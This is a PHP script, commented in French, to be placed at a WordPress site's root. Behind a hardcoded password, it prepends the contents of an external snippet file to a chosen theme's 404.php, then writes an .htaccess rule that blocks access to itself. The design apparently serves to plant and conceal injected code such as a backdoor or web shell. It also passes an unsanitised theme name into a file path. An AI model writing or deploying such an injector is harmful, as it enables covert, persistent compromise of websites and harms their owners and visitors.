<?php
/**
 * Script unique à placer à la racine du site.
 * Ce script :
 *  - Affiche un formulaire pour demander le mot de passe.
 *  - Si le mot de passe est correct, il recherche le dossier wp-content/themes,
 *    liste les thèmes (les dossiers) et propose à l’utilisateur de sélectionner l’un d’eux.
 *  - Une fois le thème choisi, il ouvre le fichier 404.php du thème et y insère un extrait de code
 *  - Enfin, il se désactive en écrivant une règle de refus dans le .htaccess pour son propre fichier.
 */

session_start();

// Définir le mot de passe (à personnaliser)
$motdepasseAttendu = 'passsssss428575'; // modifiez ici

// Si aucune action n'est définie, on affiche le formulaire de mot de passe
if (!isset($_POST['action'])) {
    ?>
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="utf-8">
        <title>Accès protégé</title>
    </head>
    <body>
        <form method="post">
            <label>Mot de passe : <input type="password" name="motdepasse"></label>
            <input type="hidden" name="action" value="verify">
            <input type="submit" value="Valider">
        </form>
    </body>
    </html>
    <?php
    exit;
}

// Action de vérification du mot de passe
if ($_POST['action'] == 'verify') {
    if (!isset($_POST['motdepasse']) || $_POST['motdepasse'] !== $motdepasseAttendu) {
        echo "Mot de passe incorrect.";
        exit;
    }
    // Mot de passe correct : lister les thèmes
    $themesDir = 'wp-content/themes';
    if (!is_dir($themesDir)) {
        echo "Le dossier wp-content/themes n'existe pas.";
        exit;
    }
    // Récupérer uniquement les dossiers (excluant . et ..)
    $themes = array_filter(scandir($themesDir), function($d) use ($themesDir) {
        return $d !== '.' && $d !== '..' && is_dir($themesDir . '/' . $d);
    });
    if (empty($themes)) {
        echo "Aucun thème trouvé.";
        exit;
    }
    ?>
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="utf-8">
        <title>Sélection du thème</title>
    </head>
    <body>
        <form method="post">
            <label>Sélectionnez un thème :
                <select name="theme">
                    <?php foreach ($themes as $theme): ?>
                        <option value="<?php echo htmlspecialchars($theme); ?>"><?php echo htmlspecialchars($theme); ?></option>
                    <?php endforeach; ?>
                </select>
            </label>
            <!-- On réutilise le mot de passe pour la prochaine étape -->
            <input type="hidden" name="motdepasse" value="<?php echo htmlspecialchars($_POST['motdepasse']); ?>">
            <input type="hidden" name="action" value="install">
            <input type="submit" value="Installer le code">
        </form>
    </body>
    </html>
    <?php
    exit;
}

// Action d'installation
if ($_POST['action'] == 'install') {
    // Revérification du mot de passe
    if (!isset($_POST['motdepasse']) || $_POST['motdepasse'] !== $motdepasseAttendu) {
        echo "Mot de passe incorrect.";
        exit;
    }
    // Vérifier la sélection d’un thème
    if (!isset($_POST['theme']) || empty($_POST['theme'])) {
        echo "Aucun thème sélectionné.";
        exit;
    }
    $selectedTheme = $_POST['theme'];
    $themePath = "wp-content/themes/$selectedTheme";
    $targetFile = "$themePath/404.php";

    if (!file_exists($targetFile)) {
        echo "Le fichier 404.php n'existe pas dans le thème sélectionné.";
        exit;
    }

    // Lire le contenu actuel du fichier 404.php
    $content = file_get_contents($targetFile);
    if ($content === false) {
        echo "Impossible de lire le fichier 404.php.";
        exit;
    }

    // Définir l'extrait de code à insérer (pour l'instant : echo 'hello';)
	// Lire le contenu du fichier debut404.php comme extrait de code
	$snippetFile = 'debut404wpclassictheme.php';
	if (!file_exists($snippetFile)) {
	    echo "Le fichier de snippet ($snippetFile) n'existe pas.";
	    exit;
	}
	$codeSnippet = file_get_contents($snippetFile);
	if ($codeSnippet === false) {
	    echo "Erreur lors de la lecture du fichier de snippet.";
	    exit;
	}

    // Vérifier si le code n'est pas déjà présent
    if (strpos($content, $codeSnippet) !== false) {
        echo "Le code est déjà installé dans le fichier.";
    } else {
		$content = preg_replace('/^<\?php/', '', $content, 1);

		    // Préfixer le fichier avec l'extrait de code
		    $newContent = $codeSnippet . $content;
		    if (file_put_contents($targetFile, $newContent) === false) {
		        echo "Erreur lors de l'écriture dans le fichier 404.php.";
		        exit;
		    }
		    echo "Code installé avec succès dans $targetFile.<br>";
		}

    // Auto-désactivation du script via modification du .htaccess pour bloquer l'accès à ce fichier
    $htaccessFile = ".htaccess";
    $scriptName = basename(__FILE__);
    // La règle ci-dessous ne bloque que l'accès à ce script et non l'ensemble du site
    $denyRule = "\n<Files \"$scriptName\">\n    Order Allow,Deny\n    Deny from all\n</Files>\n";
    if (file_put_contents($htaccessFile, $denyRule, FILE_APPEND) === false) {
        echo "Erreur lors de la désactivation du script via .htaccess.";
        exit;
    }
    echo "Script désactivé.";
    exit;
}
?>
